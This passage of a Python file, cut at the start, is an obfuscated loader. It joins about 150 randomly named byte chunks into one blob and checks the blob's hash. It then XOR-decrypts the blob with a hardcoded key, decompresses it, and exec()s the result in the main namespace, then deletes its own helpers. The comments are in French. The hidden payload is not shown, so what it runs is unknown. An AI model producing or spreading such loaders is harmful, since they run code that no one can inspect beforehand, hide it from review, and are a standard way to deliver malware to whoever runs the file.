_coHFDSLNUdJwed + _cltH7IRIquOkvH + _ctIrq138QlNy56 + _cw6sWb2O1lkQNO + _canp66WWRF6qxG + _cjeGsJzKbpQPz9 + _ctMztVmoT7Z47l + _cb_urI7wt1UlOW + _cvcrrJI5Gz3RbF + _cqFrFlzFqPqhdR + _cienlMIXQGtqiW + _cn1Tnc4m1DOEVP + _cuLY16BfMPbKHQ + _cvsUgkfO4Txmfn + _cn7h6IDlfx2FOJ + _caIit7vjn9Kdxi + _ctjVkWg2Na3Y1u + _cvRBBYDJK1HsEX + _crZM3eY4TmMwen + _ci_Jhm84lKlHAf + _ceG7dBBgYLxsmq + _c_f5oCnGkj8_7R + _ci0HnCYu5QXOCz + _cps97DlDVNk7hM + _ce4C6xRY46WA8T + _ctbyhI1cyP6SGo + _chi_B9TPTh6x8_ + _ctaiVCNIQlBRhm + _cwC9WwRSK63Nnu + _coUGFH8URvnDO1 + _cqaqvQzoB5PMh7 + _ctwRv5ek_LDS90 + _coLf7J43KBaNc_ + _cp06UdvdWNqzU8 + _ce7OerpjY_6SiO + _c_URz_I6c9fy2j + _cnwMEOFoGqUijZ + _cfyRWrY3oLnK2e + _cybteTyly5Pp9t + _cdTSGTHwMOfBrT + _csPD0csA1R4YOT + _cudsfyyPeWM8nA + _cuojkxSM29WOK1 + _cnj5Wj36eOMKve + _cqJwefRxqT0Ets + _cksBHpHY6T6xW5 + _crD03dsoCOP_bQ + _cg57sk2Zfmrjac + _cktsElftmEeGXu + _crIrxAV4mdj_47 + _cnIbyXjbMu2Z4P + _clnACnsEvW1Aov + _csH9mWsdmE_kJp + _cxH0n51874iSFO + _csQSaGaEWjKcGR + _couVJPgMshA442 + _cxqyMHPxhUxOi6 + _cw1KKe5eMCK74m + _c_u7KoCfQsIAlY + _czEBQhsb0eevwT + _cqfiZwqn7SzmSQ + _cfDa6hiwVWaOX6 + _cmBLYI4QzzNLoX + _ctMNsMOSA4Azk0 + _cdPn3wLlcfn2ep + _crXHHUVu_EWEXS + _cvTGIu7sCJ9b9A + _clrAmXw9qVdMh9 + _cgtmwRwxnT72F4 + _cpyzI0wla1f7Y3 + _cn1BHL1vR7OIQh + _cwNd5uMiiphv4_ + _ccbz3tNGPyBbWr + _cxVbhO8a4EMAcS + _ciqebIfwCIPGC_ + _cqjdkV3Y6zFjaL + _cljCZRxrW8LhVz + _cd34579c3Tt_6p + _cliCdMcQfUecZU + _ceqWyztcrY1O_D + _cuc1rGYGUvhwoO + _cpjXezHfEohHM6 + _czGvpGtidPAVZV + _cb2m1F43Vj5jKG + _clGbgY8p563vmS + _cgLBBd7gG3Q_Sk + _cuEezMm5qTxsEH + _cjjToErqCVQJfx + _clmzLlVD9WbmPQ + _cet49ihXIEt9ar + _cxmDyDuvo9TZpP + _cl2PH0oaxrjejT + _c_MMrn0sPnjfOc + _coIc_QbikuDlib + _cq5VOTy2n_s7dV + _ct1281x7MECWqS + _ciu87K69aw6klH + _cbQKE5VoMsgdSS + _clyKWdBdKks4mM + _cmY5k6uYFG7OFR + _cwea_KMYd4WmYb + _cdhfuO_skU_rME + _coNUla8dDWWZ0t + _cqwrMkk7loXrDW + _clHsxe3QxiG8CX + _cfCQNmrvYUcumy + _csZpFM3C8dcLbX + _cc8Naz8Y81At5F + _c_7n9QDl4HC8jd + _cmIGrimFUCSpdr + _cepqPQPoDCnsVJ + _cw_BzAzTf1O337 + _c_KL5q7jI_bFy9 + _cdGjQMILiAhAqp + _clcP4DZtWtG2dU + _cnLBOtx0ZwR3cL + _cwJzvIyBab3GR5 + _cnh5luNZ_6J_wO + _cw0A4RVSVkpZZp + _cwmjdsK9OvqQ42 + _cke6f1cjG9dGEN + _cz51Q5FZrMZQLE + _cbpm3Or_zfl8XM + _clBYLdASg63Dpv + _cjZMNJbQbIG2yW + _cfDqFbPbsh4ijw + _crEPfdbGal6HNY + _clwBrN6iNEmq3x + _ctZPa6uqN3yYBe + _cpuXiVp_1CZHcP + _ciASA42pDatCFH + _chIeqFDlLNQalR + _crUYMHvfwaOkK3 + _cliSrCbs0o_s66 + _cbx7M1ACUUkvUI + _cbyW5wP1Z0bJgG + _cr_17CkGXvR3du + _ceA4CgNyVMhiXI + _ceAc3cRiSs6eC7 + _cqeSwg4ZVWW6od + _coeZjnHrxRMMH0 + _caNyuEdQ4U1U9s + _cljiU0Wn6bnD2P + _c_SH0Gcc_ykHBa)
if __import__('hashlib').sha256(_pdE_xMs45bkEZb).hexdigest() != 'b3c63dd02f3d6e990aa3302424c5c844e797c465cdff097eeddf73881dcbe3a2':
    __import__('sys').exit(1)
_xhiRKhawPgF1vw = bytes([149, 186, 128, 100, 62, 105, 167, 217])
_fkeBiZCrhFNB_2g = bytes([184, 182, 205, 6, 131, 228, 168, 180])

def _fxz23303Cnm13gu(_bmGdstcuXAgs8O, _kkzckItCdszZrn):
    return bytes(_bmGdstcuXAgs8O[_iyOlH0_XUOxiPn] ^ _kkzckItCdszZrn[_iyOlH0_XUOxiPn % len(_kkzckItCdszZrn)] for _iyOlH0_XUOxiPn in range(len(_bmGdstcuXAgs8O)))

def _fdkmfVkE5qa597Z(_twZUTaI7HH3pBv):
    import zlib
    return zlib.decompress(_twZUTaI7HH3pBv) # Un seul niveau de zlib ici pour simplifier

def _feuyfHDVlNJJuDy():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xp7JC0qBSdvhAE = _fxz23303Cnm13gu(_pdE_xMs45bkEZb, _xhiRKhawPgF1vw)
    # 2. Décompression Zlib
    _dzMyburfNPEByM = _fdkmfVkE5qa597Z(_xp7JC0qBSdvhAE)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dzMyburfNPEByM.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nrX0tJs7QDggFl = _main.__dict__
    _nrX0tJs7QDggFl.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nrX0tJs7QDggFl)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feuyfHDVlNJJuDy()
try:
    del _fxz23303Cnm13gu, _fdkmfVkE5qa597Z, _feuyfHDVlNJJuDy
    del _pdE_xMs45bkEZb, _xhiRKhawPgF1vw, _fkeBiZCrhFNB_2g
except:
    pass
